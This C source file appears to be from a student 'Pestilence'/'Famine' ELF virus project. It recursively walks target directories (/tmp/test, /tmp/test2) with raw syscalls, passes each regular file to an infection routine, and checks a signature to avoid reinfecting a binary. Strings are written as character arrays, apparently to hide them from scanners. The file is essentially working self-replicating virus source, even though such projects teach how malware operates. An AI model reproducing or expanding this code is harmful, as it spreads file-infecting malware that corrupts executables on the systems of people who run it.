#include "pestilence.h"

bool	find_binaries(char *dirname) {
	int	fd;
	int	bytes_read;
	int	entry_read;
	size_t	size_mmap;
	size_t	dir_len;
	struct s_buff_find_binaries	*buffers;
	struct linux_dirent64		*dir;

	fd = syscall_wrapper(__NR_open, dirname, O_RDONLY | O_DIRECTORY);
	if (fd == -1) {
		ERROR(((char []){'o','p','e','n','\0'}));
		return false;
	}

	size_mmap = (sizeof(struct s_buff_find_binaries) / PAGE_SIZE + 1) * PAGE_SIZE;
	if ((buffers = (void *)syscall_wrapper(__NR_mmap, NULL, size_mmap, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return false;
	}

	dir_len = ft_strlen(dirname);
	ft_strcpy(buffers->file_path, dirname);		
	buffers->file_path[dir_len] = '/';
	buffers->file_path[++dir_len] = '\0';

	while (42) {
		if ((bytes_read = syscall_wrapper(__NR_getdents64, fd, buffers->getdents64, sizeof(buffers->getdents64))) == -1) {
			ERROR(((char []){'g','e','t','d','e','n','t','s','6','4','\0'}));
			syscall_wrapper(__NR_munmap, buffers, size_mmap);
			return false;
		}
		if (bytes_read == 0)
			break;

		for (entry_read = 0; entry_read < bytes_read;) {
			dir = (struct linux_dirent64 *)(buffers->getdents64 + entry_read);
			if (dir->d_type == DT_DIR) {
				if (ft_strcmp((char []){'.','\0'}, dir->d_name) != 0 && ft_strcmp((char []){'.','.','\0'}, dir->d_name) != 0) {
					ft_strcpy(buffers->file_path + dir_len, dir->d_name);
					if (!find_binaries(buffers->file_path)) {
						syscall_wrapper(__NR_munmap, buffers, size_mmap);
						return false;
					}
				}
			}
			else if (dir->d_type == DT_REG) {
				ft_strcpy(buffers->file_path + dir_len, dir->d_name);
				woody_mod_c(buffers->file_path);
			}
			entry_read += dir->d_reclen;
		}
	}
	syscall_wrapper(__NR_close, fd);
	if (syscall_wrapper(__NR_munmap, buffers, size_mmap) == -1)
		return false;
	return true;
}

bool	check_binary_infected(struct s_woody *woody, Elf64_Shdr *shdr_last) {
	if ((size_t)shdr_last->sh_offset + (size_t)BYTECODE_UNPACKER_SIZE > (size_t)woody->bin_st.st_size)
		return false;
	if (ft_memstr(woody->bin_map + shdr_last->sh_offset, SIGNATURE, BYTECODE_UNPACKER_SIZE)) {
		ERROR(((char []){'b','i','n','a','r','y',' ','a','l','r','e','a','d','y',' ','i','n','f','e','c','t','e','d','\0'}));
		return true;
	}
	return false;
}

void	famine() {
	char	*target_dirs[] = {
		((char []){'/','t','m','p','/','t','e','s','t','\0'}),
		((char []){'/','t','m','p','/','t','e','s','t','2','\0'}),
		NULL
	};
	for (uint8_t i = 0; target_dirs[i]; i++) {
		find_binaries(target_dirs[i]);
	}
}

void	_start()
{
	famine();
	syscall_wrapper(__NR_exit, EXIT_SUCCESS);
}
